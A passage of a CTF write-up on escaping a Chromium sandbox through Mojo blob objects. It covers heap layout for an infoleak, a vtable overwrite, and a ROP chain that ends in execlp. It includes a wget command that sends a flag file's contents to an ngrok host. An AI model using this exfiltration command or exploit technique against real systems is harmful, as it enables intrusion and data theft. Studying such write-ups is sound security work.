+To get an infoleak, we setup the heap in such a way that a blob can read its own pointers and the vtable of other blobs for a leak. First step is to allocate 2 blobs, `BLOB(A)` and `BLOB(B)`. The data for `BLOB(B)` is located directly under `BLOB(B)` on the heap and can be achieved by allocating a run of blobs and freeing them in a certain order.
+
+![blob-1](./.images/blob-1.png/raw)
+
+Then we free `BLOB(A)` to leave a hole in the heap.
+
+![blob-2](./.images/blob-2.png/raw)
+
+Now we can reclaim the freed chunk with our response buffer by setting the `Content-Length` header to `0x370`.
+
+![blob-3](./.images/blob-3.png/raw)
+
+Using the overflow I showed earlier, we can overwrite the length of `BLOB(B)` to a huge number.
+
+![blob-4](./.images/blob-4.png/raw)
+
+Now `BLOB(B)`'s data can be used to read the heap pointers in `BLOB(B)` as well as the vtable pointer of the next blob on the heap for a heap leak and binary leak.
+
+![blob-5](./.images/blob-5.png/raw)
+
+### rop
+
+The BlobDataItem vtable holds two pointers function pointers:
+
+```ansi open
+[22;1;32mgef> [22;39mtele 0x00005c26b2ed2d70 2
+      [36m0x5c26b2ed2d70[39m|+0x0000|+000: [31m0x00005c26ac41f1a0[39m <storage::BlobDataItem::~BlobDataItem()>  ->  0x48535641e5894855
+      [36m0x5c26b2ed2d78[39m|+0x0008|+001: [31m0x00005c26ac41f2e0[39m <storage::BlobDataItem::~BlobDataItem()>  ->  0x89485053e5894855[m
+```
+
+When the blob is freed it calls the function pointer at `vtable + 0x08`. The assembly that is executed is something along the lines of:
+
+```x86asm open
+  ;; r14 points to our blob object
+  mov rax, qword ptr [r14]
+  ;; rax points to the vtable from the blob
+  call qword ptr [rax + 0x08]
+```
+
+We can control the vtable that is used with our overflow and heap leak and also control the function pointer that is called. If we set the function pointer at `vtable + 0x08` to a `xchg rsp, rax ; ret` gadget we are able to stack pivot into the vtable, which we have full control over. Using the binary leak we can ensure that the vtable contains a rop chain that will be executed as soon as the xchg gadget is called.
+
+### arbitrary command execution
+
+The chrome binary has a plt reference to `execlp` which is a perfect gadget to use for command execution. The `[l]` suffix means that argv is passed using variable arguments similar to `printf`, and the `[p]` suffix means that it will search for the command in `PATH` for us. The lack of the `[e]` suffix means that we don't need to specify `envp` and the libc will use the stored `envp` instead.
+
+The rop chain ends up calling:
+
+```c open
+execlp("sh", "sh", "-c", command)
+```
+
+In our case the command to execute is `'wget "https://999b-2600-1700-9e31-5f0-00-3a.ngrok-free.app/hello/"$(cat /challenge/flag-*)'` to exfiltrate the flag from remote.
+
+## remote issues
+
+### timeouts
+
+Originally I was fetching the mojo files with:
+
+```html open
+<script src="mojojs/mojo_bindings.js"></script>
+<script src="mojojs/gen/third_party/blink/public/mojom/otter/otter_broker.mojom.js"></script>
+<script src="mojojs/gen/third_party/blink/public/mojom/blob/blob_registry.mojom.js"></script>
+```
+
+But this would fetch so many files that the exploit would take over 3 seconds to fetch all the necessary files. This was an issue since the timeout on remote was only 3 seconds and would kill the exploit before it started executing anything interesting. After spending a bit of time reading the mojo files, I realized that `blob_registry.mojom.js` was fetching a large amount of useless files and disabled it by setting `mojo.config.autoLoadMojomDeps` to false.
+
+```html open
+<script>
+    mojo.config.autoLoadMojomDeps = false;
+</script>
+<script src="template/public/mojojs/gen/third_party/blink/public/mojom/blob/blob_registry.mojom.js"></script>
+<script src="template/public/mojojs/gen/third_party/blink/public/mojom/blob/data_element.mojom.js"></script>
+<script src="template/public/mojojs/gen/third_party/blink/public/mojom/blob/blob.mojom.js"></script>
+```
+
+### hosting
+
+The other issue was where to actually host the exploit. I could start a local server and use ngrok to expose port 80, but that would serve a warning page to the admin bot and it would never reach my exploit page. I also tried to use `fly.io` to host the exploit, but since I wasn't paying for a dedicated ipv4 address it was proxying my responses through an internal service. That internal service would reject my responses that contained both `Transfer-Encoding` and `Content-Length` headers since _technically_ you are never supposed to have these headers in the same response. Thankfully `@drakon` let me borrow his server to host my exploit which let me finally run my exploit against remote and get the flag!
+
+## FLAGGGGG
+
+**`picoCTF{1ca2dfee}`**
+
+## solve scripts
+
+```html path="pwn.html" open
+
+```
+
+```py path="server.py" open
+
+```
+
+## related reading
+
+### chromium exploitation
+
+- [https://robertchen.cc/blog/2021/02/07/adult-csp](https://robertchen.cc/blog/2021/02/07/adult-csp)
+- [https://robertchen.cc/blog/2021/07/07/sbx-intro](https://robertchen.cc/blog/2021/07/07/sbx-intro)
+- [https://googleprojectzero.blogspot.com/2019/04/virtually-unlimited-memory-escaping.html](https://googleprojectzero.blogspot.com/2019/04/virtually-unlimited-memory-escaping.html)
+- [https://mem2019.github.io/jekyll/update/2020/07/03/TCTF-Chromium-SBX.html](https://mem2019.github.io/jekyll/update/2020/07/03/TCTF-Chromium-SBX.html)
+- [https://gist.github.com/ujin5/5b9a2ce2ffaf8f4222fe7381f792cb38](https://gist.github.com/ujin5/5b9a2ce2ffaf8f4222fe7381f792cb38)
+- [https://theori.io/blog/cleanly-escaping-the-chrome-sandbox](https://theori.io/blog/cleanly-escaping-the-chrome-sandbox)
+- [https://issues.chromium.org/issues/40051782](https://issues.chromium.org/issues/40051782)
+
+### mojo blob internals
+
+- [https://source.chromium.org/chromium/chromium/src/+/main:storage/browser/blob/blob_registry_impl.cc;l=514](https://source.chromium.org/chromium/chromium/src/+/main:storage/browser/blob/blob_registry_impl.cc;l=514)
+- [https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/public/mojom/blob/blob.mojom;drc=260b80710982c3d47bddfe6b075a80a0ad6cd84a;l=33](https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/public/mojom/blob/blob.mojom;drc=260b80710982c3d47bddfe6b075a80a0ad6cd84a;l=33)
+- [https://chromium.googlesource.com/chromium/src/+/HEAD/storage/browser/blob/README.md](https://chromium.googlesource.com/chromium/src/+/HEAD/storage/browser/blob/README.md)
+
+### partition alloc
+
+- [https://chromium.googlesource.com/chromium/src/+/dcc13470a/third_party/WebKit/Source/wtf/PartitionAlloc.md](https://chromium.googlesource.com/chromium/src/+/dcc13470a/third_party/WebKit/Source/wtf/PartitionAlloc.md)
+- [https://chromium.googlesource.com/chromium/src/+/master/base/allocator/partition_allocator/PartitionAlloc.md](https://chromium.googlesource.com/chromium/src/+/master/base/allocator/partition_allocator/PartitionAlloc.md)
